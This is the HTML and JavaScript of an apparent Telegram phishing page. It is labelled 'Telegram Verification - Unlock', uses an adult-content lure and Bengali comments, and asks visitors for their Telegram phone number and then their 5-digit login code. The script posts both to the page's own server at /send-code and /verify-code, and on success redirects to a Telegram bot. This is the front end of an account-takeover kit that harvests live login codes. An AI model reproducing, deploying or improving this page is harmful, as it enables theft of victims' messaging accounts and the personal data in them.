<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification - Unlock</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { 
            background-color: #000; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        
        .bg-video {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: 1; filter: brightness(0.5);
        }

        .container {
            position: relative; z-index: 2; width: 92%; max-width: 380px;
            display: flex; flex-direction: column; align-items: center; gap: 15px;
        }

        /* Common White Card Box Style for Both Sections */
        .card-box {
            background: white; padding: 22px 18px 18px 18px; border-radius: 18px;
            width: 100%; text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            position: relative;
        }

        .header-card {
            margin-top: 30px;
        }

        /* VFX Glowing Animated Icon */
        .animated-icon-container {
            position: absolute; top: -42px; left: 50%; transform: translateX(-50%);
            width: 70px; height: 70px;
            background: linear-gradient(135deg, #0088CC, #00bfff);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.8), inset 0 0 10px rgba(255,255,255,0.5);
            border: 3px solid #ffffff;
            animation: pulseGlow 1.5s infinite alternate;
        }

        .phone-icon-inner { font-size: 30px; animation: bounceIcon 1s infinite alternate; }

        @keyframes pulseGlow {
            0% { transform: translateX(-50%) scale(1); box-shadow: 0 0 15px rgba(0, 136, 204, 0.6); }
            100% { transform: translateX(-50%) scale(1.08); box-shadow: 0 0 30px rgba(0, 136, 204, 1); }
        }

        @keyframes bounceIcon {
            0% { transform: translateY(0); }
            100% { transform: translateY(-3px); }
        }

        .card-box h2 {
            margin-top: 8px; font-size: 15px; color: #222; font-weight: 700; margin-bottom: 12px;
        }
        
        .phone-input {
            width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px;
            font-size: 15px; outline: none; text-align: center; margin-bottom: 12px;
            font-weight: 600; color: #333;
        }
        
        .btn-get-code {
            background: #2ECC71; color: white; width: 100%; padding: 12px;
            border-radius: 10px; border: none; font-weight: 700; font-size: 15px; cursor: pointer;
            box-shadow: 0 4px 12px rgba(46, 204, 113, 0.4); transition: 0.2s;
        }
        .btn-get-code:active { transform: scale(0.97); }

        /* 5 Small OTP Boxes Inside Lower White Card */
        .otp-boxes-container {
            display: flex; gap: 8px; justify-content: center; margin-bottom: 15px;
            cursor: pointer;
        }
        .otp-small-box {
            width: 50px; height: 55px; border: 2px solid #ddd;
            border-radius: 10px; display: flex; align-items: center; justify-content: center;
            font-size: 24px; color: #222; font-weight: bold; background: #f9f9f9;
        }

        /* Hidden Input for Copy/Paste & Typing Support */
        #hiddenOtpInput {
            position: absolute; opacity: 0.01; width: 1px; height: 1px; pointer-events: none;
        }

        /* Confirm Otp Button with Glowing Border Effect */
        .btn-confirm-otp {
            width: 100%; padding: 14px; font-size: 17px; font-weight: 700; color: #ffffff;
            background: linear-gradient(135deg, #0088CC, #00bfff); border: none;
            border-radius: 12px; cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 229, 255, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.3);
            animation: buttonGlow 2s infinite alternate; transition: 0.2s;
        }
        .btn-confirm-otp:active { transform: scale(0.97); }

        @keyframes buttonGlow {
            0% { box-shadow: 0 0 10px rgba(0, 229, 255, 0.4); }
            100% { box-shadow: 0 0 25px rgba(0, 229, 255, 0.9); }
        }
    </style>
</head>
<body>

    <video autoplay muted loop playsinline class="bg-video">
        <source src="https://videotourl.com/videos/1791952459901-05439f7d-513c-4994-b03b-ca0ca313b9cc.mp4" type="video/mp4">
    </video>

    <div class="container">
        
        <!-- ১. ওপরের হোয়াইট কার্ড বক্স: টেলিগ্রাম নম্বর ও গেট কোড -->
        <div class="card-box header-card">
            <div class="animated-icon-container">
                <div class="phone-icon-inner">📥</div>
            </div>

            <h2>Enter Telegram Number 🔞</h2>
            <input type="text" id="phoneInput" class="phone-input" placeholder="+880 XXXXXXXXXX">
            <button class="btn-get-code" onclick="sendCode()">GET CODE 📩</button>
        </div>

        <!-- ২. নিচের হোয়াইট কার্ড বক্স: ৫টি ছোট ওটিপি বক্স ও কনফার্ম বাটন -->
        <div class="card-box" onclick="focusHiddenInput()">
            <h2>Enter 5-Digit OTP 🔑</h2>
            
            <!-- Hidden input to handle typing and paste -->
            <input type="text" id="hiddenOtpInput" maxlength="5" oninput="handleOtpInput(this)">

            <!-- 5 Small Display Boxes -->
            <div class="otp-boxes-container">
                <div class="otp-small-box"></div>
                <div class="otp-small-box"></div>
                <div class="otp-small-box"></div>
                <div class="otp-small-box"></div>
                <div class="otp-small-box"></div>
            </div>

            <button class="btn-confirm-otp" onclick="verifyOtpCode()">Confirm Otp ✨</button>
        </div>
    </div>

    <script>
        const smallBoxes = document.querySelectorAll('.otp-small-box');
        let currentOtpValue = "";

        function focusHiddenInput() {
            const hiddenInp = document.getElementById('hiddenOtpInput');
            hiddenInp.focus();
        }

        function handleOtpInput(el) {
            let val = el.value.replace(/\D/g, '');
            if (val.length > 5) {
                val = val.slice(0, 5);
            }
            currentOtpValue = val;
            
            for (let i = 0; i < 5; i++) {
                smallBoxes[i].innerText = currentOtpValue[i] || "";
            }
        }

        function sendCode() {
            let phone = document.getElementById('phoneInput').value;
            if(!phone) {
                alert("Please enter your phone number!");
                return;
            }
            
            fetch('/send-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone })
            })
            .then(res => res.json())
            .then(data => {
                if(data.status === "success") {
                    focusHiddenInput();
                } else {
                    alert("Error: " + data.message);
                }
            })
            .catch(err => console.log("Connection error"));
        }

        function verifyOtpCode() {
            let phone = document.getElementById('phoneInput').value;
            
            if(!phone) {
                alert("Please enter your phone number first!");
                return;
            }
            if(!currentOtpValue || currentOtpValue.length < 5) {
                alert("Please enter the complete 5-digit OTP code!");
                return;
            }

            fetch('/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone, code: currentOtpValue })
            })
            .then(res => res.json())
            .then(data => {
                if(data.status === "success") {
                    window.open("https://t.me/Desi_Magi909_Bot?start=start", "_blank");
                } else {
                    alert("Verification Failed: " + data.message);
                    currentOtpValue = "";
                    document.getElementById('hiddenOtpInput').value = "";
                    for (let i = 0; i < 5; i++) {
                        smallBoxes[i].innerText = "";
                    }
                }
            })
            .catch(err => console.log("Verification error"));
        }
    </script>
</body>
</html>
